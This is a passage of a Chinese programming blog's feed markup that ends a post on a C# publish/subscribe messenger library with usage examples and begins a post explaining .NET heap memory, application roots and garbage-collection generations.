class="keyword">void</span> <span class="title">Dispose</span>(<span class="params"><span class="keyword">bool</span> isDisposing</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (isDisposing)</span><br><span class="line">        &#123;</span><br><span class="line">            _disposeMe();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当我们创建 <code>SubscriptionToken</code> 的实例时，实际上我们传递了一个方法来销毁自己-因此，当调用 <code>Dispose</code> 方法时，它将首先取消订阅。  </p>
<h2 id="Unsubscribe-取消订阅"><a href="#Unsubscribe-取消订阅" class="headerlink" title="Unsubscribe - 取消订阅"></a>Unsubscribe - 取消订阅</h2><p>&emsp;&emsp;取消订阅消息的方法如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">async</span> Task Unsubscribe&lt;TMessage&gt;(SubscriptionToken subscriptionToken) <span class="keyword">where</span> TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">await</span> UnsubscribeInternal&lt;TMessage&gt;(subscriptionToken.Id);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">async</span> Task UnsubscribeInternal&lt;TMessage&gt;(Guid subscriptionId) <span class="keyword">where</span> TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (_subscriptions.TryGetValue(<span class="keyword">typeof</span>(TMessage), <span class="keyword">out</span> <span class="keyword">var</span> messageSubscriptions))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (messageSubscriptions.ContainsKey(subscriptionId))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> result = messageSubscriptions.TryRemove(subscriptionId, <span class="keyword">out</span> BaseSubscription <span class="keyword">value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这段代码很容易理解。当我们取消订阅消息时，订阅将从字典中删除。  </p>
<h2 id="Publish-发布"><a href="#Publish-发布" class="headerlink" title="Publish - 发布"></a>Publish - 发布</h2><p>&emsp;&emsp;我们已经订阅了消息，并创建了存储在字典中的订阅实例。现在可以发布消息了。发布消息的方法如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">async</span> Task Publish&lt;TMessage&gt;(TMessage message) <span class="keyword">where</span> TMessage : Message</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (message == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="keyword">nameof</span>(message));</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;BaseSubscription&gt; toPublish = <span class="literal">null</span>;</span><br><span class="line">    Type messageType = message.GetType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_subscriptions.TryGetValue(messageType, <span class="keyword">out</span> <span class="keyword">var</span> messageSubscriptions))</span><br><span class="line">    &#123;</span><br><span class="line">        toPublish = messageSubscriptions.Values.OrderByDescending(x =&gt; x.Priority).ToList();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (toPublish == <span class="literal">null</span> || toPublish.Count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    List&lt;Guid&gt; deadSubscriptionIds = <span class="keyword">new</span> List&lt;Guid&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> subscription <span class="keyword">in</span> toPublish)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Execute the action for this message.</span></span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> subscription.Invoke(message);</span><br><span class="line">        <span class="keyword">if</span> (!result)</span><br><span class="line">        &#123;</span><br><span class="line">            deadSubscriptionIds.Add(subscription.Id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (deadSubscriptionIds.Any())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">await</span> PurgeDeadSubscriptions(messageType, deadSubscriptionIds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当我们发布一条消息时，<code>MessageHub</code> 将查询字典以检索该消息的订阅列表，然后循环执行操作。<br>&emsp;&emsp;需要注意的另一件事是，由于某些订阅可能是弱引用，因此需要检查执行结果。如果引用已经被 GC 收集，则执行结果会返回 false，这时候需要将该订阅从订阅列表中删除。  </p>
<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="从NuGet安装"><a href="#从NuGet安装" class="headerlink" title="从NuGet安装"></a>从NuGet安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PM&gt; Install-Package FunCoding.CoreMessenger</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在整个应用程序域中，将 <code>MessengerHub.Instance</code> 用作单例模式。它提供了以下方法：  </p>
<ul>
<li><p>发布：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">async</span> Task Publish&lt;TMessage&gt;(TMessage message)</span><br></pre></td></tr></table></figure>
</li>
<li><p>订阅：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SubscriptionToken Subscribe&lt;TMessage&gt;(Action&lt;TMessage&gt; action, ReferenceType referenceType = ReferenceType.Weak, SubscriptionPriority priority = SubscriptionPriority.Normal, <span class="keyword">string</span> tag = <span class="literal">null</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>取消订阅：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">async</span> Task Unsubscribe&lt;TMessage&gt;(SubscriptionToken subscriptionToken)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h2 id="创建-Message-类"><a href="#创建-Message-类" class="headerlink" title="创建 Message 类"></a>创建 <code>Message</code> 类</h2><p>&emsp;&emsp;首先，定义一个从 <code>Message</code> 继承的类，如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestMessage</span> : <span class="title">Message</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">string</span> ExtraContent &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestMessage</span>(<span class="params"><span class="keyword">object</span> sender, <span class="keyword">string</span> content</span>) : <span class="title">base</span>(<span class="params">sender</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        ExtraContent = content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在组件A中创建 <code>Message</code> 的实例，如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> message = <span class="keyword">new</span> TestMessage(<span class="keyword">this</span>, <span class="string">"Test Content"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h2><p>&emsp;&emsp;定义一个 <code>SubscriptionToken</code> 实例来存储订阅。在组件 B 中订阅消息，如下所示：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HomeViewModel</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> SubscriptionToken _subscriptionTokenForTestMessage;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HomeViewModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _subscriptionTokenForTestMessage =</span><br><span class="line">            MessengerHub.Instance.Subscribe&lt;TestMessage&gt;(OnTestMessageReceived,</span><br><span class="line">            ReferenceType.Weak, SubscriptionPriority.Normal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTestMessageReceived</span>(<span class="params">TestMessage message</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> DEBUG</span></span><br><span class="line">        System.Diagnostics.Debug.WriteLine(<span class="string">$"Received messages of type <span class="subst">&#123;message.GetType().ToString()&#125;</span>. Content: <span class="subst">&#123;message.Content&#125;</span>"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="发布-Message"><a href="#发布-Message" class="headerlink" title="发布 Message"></a>发布 <code>Message</code></h2><p>&emsp;&emsp;在组件 A 中发布消息：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task <span class="title">PublishMessage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">await</span> MessengerHub.Instance.Publish(<span class="keyword">new</span> TestMessage(<span class="keyword">this</span>, <span class="string">$"Hello World!"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;就是这么简单。  </p>
<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>&emsp;&emsp;<code>Subscribe</code> 方法的完整签名为：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SubscriptionToken Subscribe&lt;TMessage&gt;(Action&lt;TMessage&gt; action,  ReferenceType referenceType = ReferenceType.Weak, SubscriptionPriority priority = SubscriptionPriority.Normal,  <span class="keyword">string</span> tag = <span class="literal">null</span>) <span class="keyword">where</span> TMessage : Message</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;您可以指定以下参数：</p>
<ul>
<li><code>ReferenceType</code>。默认值为 <code>ReferenceType.Weak</code>，因此您不必担心内存泄漏。一旦 <code>SubscriptionToken</code> 实例超出范围，GC 便可以自动收集它（但不确定何时）。如果需要保留强引用，请将参数指定为 <code>ReferenceType.Strong</code>，以使 GC 无法收集它。</li>
<li><code>SubscriptionPriority</code>。默认值为 <code>SubscriptionPriority.Normal</code>。有时需要控制一个“消息”的订阅的执行顺序。在这种情况下，请为订阅指定不同的优先级以控制执行顺序。注意，该参数不适用于不同的 <code>Message</code>。</li>
<li><code>Tag</code>。为订阅指定一个标签，是可选的。</li>
</ul>
<h2 id="取消订阅"><a href="#取消订阅" class="headerlink" title="取消订阅"></a>取消订阅</h2><p>&emsp;&emsp;您可以使用以下方法取消订阅：  </p>
<ul>
<li><p>使用 <code>Unsubscribe</code> 方法，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> MessengerHub.Instance.Unsubscribe&lt;TestMessage&gt;(_subscriptionTokenForTestMessage);</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 <code>SubscriptionToken</code> 的 <code>Dispose</code> 方法：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_subscriptionTokenForTestMessage.Dispose();</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>&emsp;&emsp;在许多情况下，您不会直接调用这些方法。如果使用强订阅类型，则可能会导致内存泄漏问题。因此，建议使用 <code>ReferenceType.Weak</code>。请注意，如果令牌未存储在上下文中，则 GC 可能会立即收集它。例如：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">MayNotEverReceiveAMessage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> token = MessengerHub.Instance.Subscribe&lt;TestMessage&gt;((message) =&gt; &#123;</span><br><span class="line">        <span class="comment">// Do something here</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// token goes out of scope now</span></span><br><span class="line">    <span class="comment">// - so will be garbage collected *at some point*</span></span><br><span class="line">    <span class="comment">// - so the action may never get called</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="与-MvvmCross-Messenger-的差异"><a href="#与-MvvmCross-Messenger-的差异" class="headerlink" title="与 MvvmCross.Messenger 的差异"></a>与 MvvmCross.Messenger 的差异</h1><p>&emsp;&emsp;如果您已经使用 <code>MvvmCross</code> 开发应用程序，并无需在 <code>ViewModel</code> 层之外传递消息，请直接使用 <code>MvvmCross.Messenger</code>。我仅实现了一些主要方法，没有提供 UI 线程调度的功能，并删除了对 MvvmCross 组件的依赖，因此只要您的项目目标 .NET Standard 2.0 以上，就可以在任何 WPF，UWP 和 Xamarin 项目中使用。另外，<code>Publish</code> 方法始终在后台运行，以避免阻塞 UI。但是您应该知道何时需要返回 UI 线程，尤其是当您需要与 UI 控件进行交互时。另一个区别是无需使用 DI 来创建 <code>MessageHub</code> 实例，该实例是所有应用程序域中的单例实例。如果解决方案包含需要相互通信的多个组件，则单例模式会比较简单，DI 将使其更加复杂。  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[谈谈 .NET 对象生命周期]]></title>
      <url>/2019/12/10/DotNetObjectLifetime/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/MaMaNongNong/p/11945161.html" target="_blank" rel="noopener">https://www.cnblogs.com/MaMaNongNong/p/11945161.html</a></p>
</blockquote>
<a id="more"></a>

<h1 id="不用程序员操心的堆-—-托管堆"><a href="#不用程序员操心的堆-—-托管堆" class="headerlink" title="不用程序员操心的堆 — 托管堆"></a>不用程序员操心的堆 — 托管堆</h1><p>&emsp;&emsp;程序在计算机上跑着，就难免会占用内存资源来存储在程序运行过程中的数据，我们按照内存资源的存取方式将内存划分为<strong>堆内存</strong>和<strong>栈内存</strong>。  </p>
<p>&emsp;&emsp;<strong>栈内存</strong>，通常使用的场景是：<strong>对存取速度要求较高且数据量不大</strong>。  </p>
<p>&emsp;&emsp;典型的栈内存使用的例子就是函数栈，每一个函数被调用时都会被分配一块内存，这块内存被称为栈内存，以先进后出的方式存取数据，在函数执行过程中不断往函数栈中压入（PUSH）数据（值类型数据：int、float、对象的引用…），函数执行完后又将函数栈中的数据逐个弹出（POP）,由于是以操作栈的形式来存取，所以访问速度快。</p>
<figure class="image-box">
                <img src="1342524-20191129211615998-1924248009.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong>堆内存</strong>，从字面意思上理解就好像是仓库里面可以存一堆破烂，你若是需要存点什么东西就尽管往里面一扔，仓库里有的是空间。事实确实也是如此，<strong>堆内存中可以存放大规格的数据（比如对象资源）</strong>，这些数据是不适合存放在栈中的，因为栈空间的容量有限，这就是<strong>堆内存相对于栈内存的好处：容量大</strong>。但是它的缺点也是显而易见的，那就是<strong>存取堆内存的数据相较于存取栈内存是非常慢的</strong>，试想一下，让你在仓库里的一堆破烂里去找你想要的东西是什么感觉。<br>&emsp;&emsp;（栈内存比堆内存详细参考：<a href="https://blog.csdn.net/boyxiaolong/article/details/8543676" target="_blank" rel="noopener">https://blog.csdn.net/boyxiaolong/article/details/8543676</a> ）</p>
<figure class="image-box">
                <img src="1342524-20191129211711033-1091141984.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;从内存分配方式上看，堆内存不同于栈内存，函数栈是在每一个函数被执行的时候被自动分配并且函数执行完成后自动回收，而如果你想使用堆内存，就得自己动手丰衣足食。<br>&emsp;&emsp;所以你会看到 C 语言程序员会这样去使用堆内存：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> *p = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)); <span class="comment">//在堆内存中申请一块字节数为 int 字节数的堆内存，并返回指向该内存区域的指针</span></span><br><span class="line">*p = <span class="number">10</span>; </span><br><span class="line"><span class="built_in">free</span>(p); <span class="comment">//释放堆内存资源</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;你还会看见 C++ 程序员这样写：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Car* bmw = <span class="keyword">new</span> Car(); <span class="comment">//创建一个 Car 类对象，在堆内存中存放对象数据，并返回指向对象资源的指针</span></span><br><span class="line"><span class="keyword">delete</span> bmw; <span class="comment">//释放堆内存资源</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当然，没有接触过 C/C++ 的小伙伴也不用惊慌，上面只不过是想让你知道在 C/C++ 语言中，程序员要是想使用堆内存，那就必须显式地编写分配和释放堆内存资源的代码。<br>&emsp;&emsp;有人问：<strong>使用完堆内存资源后没有手动释放它会有什么后果吗？</strong><br>&emsp;&emsp;答案是：<strong>由于堆内存资源使用者未及时释放内存会导致内存无法再次使用，从而造成内存资源的泄漏（浪费）。</strong>  </p>
<p>&emsp;&emsp;就在这个时候，C# 程序员笑了，只见他的手指非常轻盈优雅地在屏幕上敲出了下面这行代码：  </p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Car bmw = <span class="keyword">new</span> Car();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;一旁围观的 C 程序员和 C++ 程序员惊呆了，他们不知道自己在敲代码的时候有没有像这样轻松过。C++ 程序员用手抚摸着他那锃光瓦亮的额头，突然眼睛里闪着光，喊道：“你还没有释放堆内存的资源呢，你这样是很危险的，会内存泄漏的，快，把释放堆内存的代码写上！”<br>&emsp;&emsp;C# 程序员似乎并不为所动，舒舒服服地靠在椅子上，用余光瞟了 C++ 程序员一眼，说：“不用慌，不用慌，这个对象在托管堆上放的好好的呢，不用我操心”，于是，C# 程序员便娓娓道来（呼呼大睡）…  </p>
<p>&emsp;&emsp;在 .NET 的世界，使用 new 关键字创建一个对象，首先对象资源被分配在托管堆中，然后 new 会返回一个指向堆上对象的引用，而不是真正的对象本身。如果在方法作用域中将引用变量声明为本地变量，这个引用变量保存在栈内，以供应用程序以后使用。</p>
<figure class="image-box">
                <img src="1342524-20191129204844737-1513276184.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;托管堆，顾名思义，就是托给别人管的堆，<strong>那么是谁在管理着这个堆上的对象资源呢</strong>？<br>&emsp;&emsp;答案是：<strong>CLR(Common Lanauage Runtime)，对象的实例化结束以后，GC(垃圾回收器)将会在对象不再需要时将其销毁。</strong><br>&emsp;&emsp;也就是说，通过允许垃圾收集器负责销毁对象，内存管理的麻烦就都交给 CLR 了，万事大吉。</p>
<figure class="image-box">
                <img src="1342524-20191208140136612-550090463.png" alt title class>
                <p></p>
            </figure>

<figure class="image-box">
                <img src="1342524-20191208140511470-318156524.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;看似问题好像都已水落石出，无非就是将堆内存资源回收交给了 CLR 去承担。难道你就不想知道的更多一点？比如接着而来的问题：<br>&emsp;&emsp;1、<strong>垃圾回收器如何判断一个对象什么时候不再需要？</strong><br>&emsp;&emsp;2、<strong>垃圾回收器又在什么时候会执行垃圾清理的操作？</strong><br>&emsp;&emsp;别急，带着问题慢慢往下看。</p>
<h1 id="CIL-的-new-指令-—-垃圾回收的触发者"><a href="#CIL-的-new-指令-—-垃圾回收的触发者" class="headerlink" title="CIL 的 new 指令 — 垃圾回收的触发者"></a>CIL 的 new 指令 — 垃圾回收的触发者</h1><p>&emsp;&emsp;C# 中的 <strong>new 关键字最终会被编译器翻译成 CIL 的 newobj 指令</strong>，让我们仔细查看一下 CIL newobj 指令的作用。</p>
<figure class="image-box">
                <img src="1342524-20191130210833848-114463754.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;首先，需要明白托管堆不仅仅是一个可由 CLR 访问的随机内存块。.NET 垃圾回收器是堆的“清洁工”，出于优化的目的它会压缩空闲的内存块（当需要时）。为了辅助压缩，托管堆会维护一个指针(通常被叫做下一个对象指针或者是新对象指针），这个指针用来标识下一个对象在堆中分配的地址。  </p>
<p>&emsp;&emsp;此外，newobj 指令通知 CLR 来执行下列的核心任务：</p>
<ol>
<li><strong>计算要分配的对象所需的全部内存（包括这个类型的数据成员和类型的基类所需的内存）。</strong></li>
<li><strong>检查托管堆来确保有足够的空间来放置所申请的对象。如果有足够的空间，会调用这个类型的构造函数，构造函数会返回一个指向内存中这个新对象的引用，这个新对象的地址刚好就是下一个对象指针上一次所指向的位置。</strong></li>
<li><strong>最后，在把引用返回给调用者之前，让下一个对象指针指向托管堆中下一个可用的位置。</strong></li>
</ol>
<p>&emsp;&emsp;下面的图解释了在托管堆上分配对象的细节。</p>
<figure class="image-box">
                <img src="1342524-20191129213725028-699571306.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;在 C# 中分配对象是一个很频繁的操作，照这样下去托管堆上的空间迟早会被挥霍完，所以，重点来了，<strong>如果 CLR 发现托管堆没有足够空间分配请求的类型时，它会执行一次垃圾回收来释放内存。</strong><br>&emsp;&emsp;当执行垃圾回收时，垃圾收集器临时挂起当前进程中的所有的活动线程来保证在回收过程中应用程序不会访问到堆。（一个线程是一个正在执行的程序中的执行路径）。一旦垃圾回收完成，挂起的线程又可以继续执行了。还好，.NET 垃圾回收器是高度优化过的，所以用户很少能察觉到应用程序中的短暂中断。<br>&emsp;&emsp;通过对 CIL 的 new 指令作用的解读，我们知道了：<strong>如果托管堆没有足够的空间分配一个请求的对象，则会执行一次垃圾回收。</strong>  </p>
<p>&emsp;&emsp;（讲到这里 C# 程序员停了下来，喝了口保温杯里的枸杞红枣大补茶🍵，清了清嗓子，继续开始解惑…）  </p>
<h1 id="应用程序根的作用-—-区分不可到达的对象"><a href="#应用程序根的作用-—-区分不可到达的对象" class="headerlink" title="应用程序根的作用 — 区分不可到达的对象"></a>应用程序根的作用 — 区分不可到达的对象</h1><p>&emsp;&emsp;现在让我们来讨论一下垃圾回收器怎样确定什么时候“<strong>不再需要</strong>”一个对象。为了理解细节，你需要知道应用程序根的概念。  </p>
<p>&emsp;&emsp;简单来说，一个根是一个引用，这个引用指向堆上面的一个对象的。严格来说，一个根可以有以下几种情况：</p>
<ul>
<li><strong>指向全局对象的引用（尽管 C# 不支持，但 CIL 代码允许分配全局对象）</strong></li>
<li><strong>指向任何静态对象</strong></li>
<li><strong>指向一个应用程序代码中的局部对象</strong></li>
<li><strong>指向传入到一个函数中的对象参数</strong></li>
<li><strong>指向等待被终结 ( finalized ) 的对象</strong></li>
<li><strong>任何一个指向对象的CPU寄存器</strong></li>
</ul>
<p>&emsp;&emsp;在一次垃圾回收的过程中，运行环境会检查托管堆上面的对象是否仍然是从应用程序根可到达的。为了检查可达，CLR 会建立一个代表堆上每个可达对象的图。对象图用来记录所有可达的对象。同时，注意垃圾回收器绝不会在图上标记一个对象两次，因此避免了烦人的循环引用。<br>&emsp;&emsp;假设托管堆上有名字为 A, B, C, D, E，F 和 G 的对象集合。在一次垃圾回收过程中，会检查这些对象（同时包括这些对象可能包含的内部对象引用）是否是根可达的。一旦图被建立起来，不可达的对象（在此是对象 C 和 F）被标记为垃圾。<br>&emsp;&emsp;下图是上述场景的一个可能的对象图（你可以把箭头读作依赖或者需要，例如 “ E 依赖于 G，间接依赖于 B， A 不依赖任何对象 ” 等）。</p>
<figure class="image-box">
                <img src="1342524-20191129213805497-1230427436.png" alt="（创建的对象图是用来决定哪些对象是应用程序根可达的。）" title class>
                <p>（创建的对象图是用来决定哪些对象是应用程序根可达的。）</p>
            </figure>

<p>&emsp;&emsp;一旦一个对象已经被标记为终结（此例子中是 C 和 F —— 在图中没有他俩），它在内存中就被清理掉了。在此时，堆上的剩余内存空间被压缩，这会导致 CLR 修改活动的应用程序根集合（和对应的指针）来指向正确的内存位置（这个操作是自动透明的）。最后，调整下一个对象指针来指向下一个可用的内存位置。<br>&emsp;&emsp;下图阐明了清除和压缩堆的过程。</p>
<figure class="image-box">
                <img src="1342524-20191129213816851-479935107.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;到这里，通过对应用程序根的作用的理解，我们知道了如何知道一个对象是“不再需要”的。<strong>通俗点来说就是，这个对象在应用程序中已经无需被访问了，成为了一座“孤岛”，自然也就不再需要它了。</strong>  </p>
<p>&emsp;&emsp;（为了让 C++ 程序员能更加理解 .NET 垃圾回收的奥妙，C# 程序员继续滔滔不绝…）  </p>
<h1 id="理解对象的代-—-垃圾回收过程的优化"><a href="#理解对象的代-—-垃圾回收过程的优化" class="headerlink" title="理解对象的代 — 垃圾回收过程的优化"></a>理解对象的代 — 垃圾回收过程的优化</h1><p>&emsp;&emsp;在尝试找到不可达的对象时，CLR 并不是检查托管堆上的每个对象。很明显，这样做会消耗大量时间，尤其在大型（例如现实中）程序中。<br>&emsp;&emsp;为了帮助优化这个过程，堆上的每个对象被分配到一个特殊的”代”。代这个概念背后的想法很简单：<strong>对象在堆上存活的时间越长，接下来它继续存在的可能性也就越大，即较旧的对象生存期长，较新的对象生存期短。</strong>例如，实现 Main() 的对象一直在内存中，直到程序结束。相反，最近才被放到堆中的对象（例如在一个函数范围里分配的对象）很可能很快就不可达。  </p>
<p>&emsp;&emsp;<strong>在堆上的每个对象属于以下的某一个代：</strong></p>
<ul>
<li><strong>Generation 0： 标识一个最近分配的还没有被标记为回收的对象</strong></li>
<li><strong>Generation 1： 标识一个经历了一次垃圾回收而存活下来的对象（例如，他被标记为回收，但由于堆空间够用而没有被清除掉）</strong></li>
<li><strong>Generation 2：标识一个经历了不止一轮垃圾回收而存活下来的对象。</strong></li>
</ul>
<p>&emsp;&emsp;垃圾回收器首先会检查 Generation 0 的所有对象。如果标记并清理这些对象（译者注：因为新对象的生存期往往较短，并且期望在执行回收时，应用程序不再使用第 0 级托管堆中的许多对象）后产生了足够使用的内存空间，任何存活下来的对象就被提升到 Generation 1。为了理解一个对象的代如何影响回收的过程，可以查看下图。下图解释了 Generation 0 中一次垃圾回收后，存活的对象被提升的过程。</p>
<figure class="image-box">
                <img src="1342524-20191129213837891-1016005857.png" alt="（Generation 0 中的存活对象被提升到 Generation 1）" title class>
                <p>（Generation 0 中的存活对象被提升到 Generation 1）</p>
            </figure>

